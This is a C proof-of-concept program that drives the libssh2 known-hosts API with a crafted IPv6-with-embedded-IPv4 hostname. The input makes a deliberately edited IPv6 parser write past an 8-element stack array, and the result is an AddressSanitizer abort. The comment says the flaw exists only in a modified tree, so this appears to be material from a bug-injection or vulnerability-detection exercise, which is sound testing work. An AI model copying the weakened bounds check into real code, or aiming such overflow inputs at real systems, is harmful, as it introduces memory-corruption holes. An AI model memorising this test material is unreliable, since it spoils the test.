/* PoC: delocalized stack-buffer-overflow in libssh2 known-hosts IPv6 parsing.
 *
 * Drives the public libssh2 known-hosts API with in-contract input:
 *   - store a normal plain known-hosts entry via libssh2_knownhost_readline()
 *   - check an attacker-influenced hostname via libssh2_knownhost_checkp()
 *
 * The crafted hostname is an over-long IPv6-with-embedded-IPv4 literal. On the
 * resulting (edited) tree, knownhost_parse_ipv6() writes two 16-bit words for
 * the embedded IPv4 tail guarded only by a single "count >= 8" check, so with
 * seven leading groups it writes one element past the 8-element stack array.
 * AddressSanitizer aborts. On the original batch (and on main) the parser
 * either rejects the input (count > 6 guard) or does not exist, so no abort.
 */
#include <libssh2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    struct libssh2_knownhost *store = NULL;
    const char *entry =
        "example.com ssh-ed25519 "
        "AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB";
    /* seven hextets then an embedded IPv4 tail -> nine words worth */
    const char *host = "1:2:3:4:5:6:7:1.2.3.4";
    const char *key = "AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB";
    int rc;

    if(libssh2_init(0))
        return 2;

    session = libssh2_session_init();
    if(!session)
        return 2;

    hosts = libssh2_knownhost_init(session);
    if(!hosts)
        return 2;

    rc = libssh2_knownhost_readline(hosts, entry, strlen(entry),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    if(rc) {
        fprintf(stderr, "readline failed: %d\n", rc);
        return 2;
    }

    /* port < 0: the parser sees the hostname verbatim */
    rc = libssh2_knownhost_checkp(hosts, host, -1, key, strlen(key),
                                  LIBSSH2_KNOWNHOST_TYPE_PLAIN |
                                  LIBSSH2_KNOWNHOST_KEYENC_RAW |
                                  LIBSSH2_KNOWNHOST_KEY_ED25519,
                                  &store);

    printf("check returned %d\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
